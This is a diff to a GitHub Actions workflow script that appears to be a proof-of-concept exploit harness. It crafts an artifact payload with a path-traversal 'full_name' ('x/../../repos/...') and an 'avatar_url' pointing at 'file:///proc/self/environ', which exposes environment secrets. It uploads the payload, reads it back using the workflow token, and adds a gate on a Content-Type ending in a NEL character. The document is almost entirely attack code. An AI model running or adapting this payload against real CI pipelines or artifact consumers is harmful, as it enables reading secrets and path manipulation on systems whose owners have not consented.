@@ -39,7 +39,7 @@ jobs:
               if (!r.ok) throw new Error(`Artifact blob PUT failed HTTP ${r.status}`);
             }
             const repo = process.env.GITHUB_REPOSITORY;
-            const make = id => Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${id}/zip`, owner:{login:repo.split('/')[0], avatar_url:'file:///proc/self/environ'}}));
+            const make = id => Buffer.from(JSON.stringify({full_name:`x/../../repos/${repo}/actions/artifacts/${id}/zip`, owner:{login:repo.split('/')[0], avatar_url:'file:///proc/self/environ'}}));
             const placeholder = make('00000000000');
             await put(placeholder);
             const hash = 'sha256:' + createHash('sha256').update(placeholder).digest('hex');
@@ -49,7 +49,7 @@ jobs:
             const payload = make(artifactId);
             await put(payload);
             const download = `https://api.github.com/repos/${repo}/actions/artifacts/${artifactId}/zip`;
-            const redirect = await fetch(download, {headers:{Authorization:`Bearer ${process.env.GITHUB_TOKEN}`, Accept:'application/vnd.github+json'}, redirect:'manual'});
+            const redirect = await fetch(download, {headers:{Authorization:`Bearer ${process.env.GITHUB_TOKEN}`, Accept:'application/vnd.github.v3+json'}, redirect:'manual'});
             const location = redirect.headers.get('location');
             if (redirect.status !== 302 || !location) throw new Error(`Artifact download endpoint HTTP ${redirect.status}`);
             const response = await fetch(location);
@@ -60,7 +60,10 @@ jobs:
             core.info(`PAYLOAD_BYTES=${payload.length} PAYLOAD_SHA256=${sha(payload)}`);
             core.info(`DOWNLOAD_STATUS=${response.status} MIME_LATIN1_HEX=${Buffer.from(type,'latin1').toString('hex')}`);
             core.info(`BODY_BYTES=${bytes.length} BODY_SHA256=${sha(bytes)} BODY_MATCH=${bytes.equals(payload)}`);
+            core.info(`REPOSITORY=${JSON.parse(payload.toString()).full_name}`);
+            core.info(`MIME_GATE=${type === 'application/json\u0085'}`);
             core.summary.addHeading('Payload artifact readback').addTable([['Field','Value'],['Artifact ID',artifactId],['Download status',String(response.status)],['Content-Type bytes (hex)',Buffer.from(type,'latin1').toString('hex')],['Payload SHA-256',sha(payload)],['Body SHA-256',sha(bytes)],['Exact body match',String(bytes.equals(payload))]]);
             await core.summary.write();
             if (!response.ok) throw new Error(`Artifact readback HTTP ${response.status}`);
+            if (!bytes.equals(payload) || type !== 'application/json\u0085') throw new Error('Exact body or NEL MIME gate failed');
 
